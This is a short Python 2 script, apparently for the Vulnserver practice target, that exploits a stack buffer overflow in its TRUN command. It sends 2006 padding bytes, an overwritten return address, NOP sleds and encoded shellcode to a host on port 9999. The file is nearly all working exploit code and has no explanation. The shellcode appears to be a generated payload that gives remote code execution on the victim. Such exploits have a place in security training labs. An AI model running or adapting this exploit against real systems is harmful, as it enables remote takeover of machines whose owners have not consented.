import os
import socket
import sys

host= "192.168.2.50"
port= 9999
#77b21efd

#625011af

payload = (
"\xdb\xd7\xd9\x74\x24\xf4\xbb\xb8\x2b\x60\xc4\x5a\x2b\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x7a\x2f\x82\x31\x86\xd8\xc0"
"\xba\x76\x19\xa5\x33\x93\x28\xe5\x20\xd0\x1b\xd5\x23\xb4\x97"
"\x9e\x66\x2c\x23\xd2\xae\x43\x84\x59\x89\x6a\x15\xf1\xe9\xed"
"\x95\x08\x3e\xcd\xa4\xc2\x33\x0c\xe0\x3f\xb9\x5c\xb9\x34\x6c"
"\x70\xce\x01\xad\xfb\x9c\x84\xb5\x18\x54\xa6\x94\x8f\xee\xf1"
"\x36\x2e\x22\x8a\x7e\x28\x27\xb7\xc9\xc3\x93\x43\xc8\x05\xea"
"\xac\x67\x68\xc2\x5e\x79\xad\xe5\x80\x0c\xc7\x15\x3c\x17\x1c"
"\x67\x9a\x92\x86\xcf\x69\x04\x62\xf1\xbe\xd3\xe1\xfd\x0b\x97"
"\xad\xe1\x8a\x74\xc6\x1e\x06\x7b\x08\x97\x5c\x58\x8c\xf3\x07"
"\xc1\x95\x59\xe9\xfe\xc5\x01\x56\x5b\x8e\xac\x83\xd6\xcd\xb8"
"\x60\xdb\xed\x38\xef\x6c\x9e\x0a\xb0\xc6\x08\x27\x39\xc1\xcf"
"\x48\x10\xb5\x5f\xb7\x9b\xc6\x76\x7c\xcf\x96\xe0\x55\x70\x7d"
"\xf0\x5a\xa5\xd2\xa0\xf4\x16\x93\x10\xb5\xc6\x7b\x7a\x3a\x38"
"\x9b\x85\x90\x51\x36\x7c\x73\x9e\x6f\x7c\xad\x76\x72\x80\xa0"
"\xda\xfb\x66\xa8\xf2\xad\x31\x45\x6a\xf4\xc9\xf4\x73\x22\xb4"
"\x37\xff\xc1\x49\xf9\x08\xaf\x59\x6e\xf9\xfa\x03\x39\x06\xd1"
"\x2b\xa5\x95\xbe\xab\xa0\x85\x68\xfc\xe5\x78\x61\x68\x18\x22"
"\xdb\x8e\xe1\xb2\x24\x0a\x3e\x07\xaa\x93\xb3\x33\x88\x83\x0d"
"\xbb\x94\xf7\xc1\xea\x42\xa1\xa7\x44\x25\x1b\x7e\x3a\xef\xcb"
"\x07\x70\x30\x8d\x07\x5d\xc6\x71\xb9\x08\x9f\x8e\x76\xdd\x17"
"\xf7\x6a\x7d\xd7\x22\x2f\x9d\x3a\xe6\x5a\x36\xe3\x63\xe7\x5b"
"\x14\x5e\x24\x62\x97\x6a\xd5\x91\x87\x1f\xd0\xde\x0f\xcc\xa8"
"\x4f\xfa\xf2\x1f\x6f\x2f"
)
buffer = 'TRUN .' +"A"*2006 + "\xaf\x11\x50\x62"+"\x90"*20+payload+"\x90"*15+'\r\n'


conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
conn.send((buffer))
print conn.recv(1024)
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()
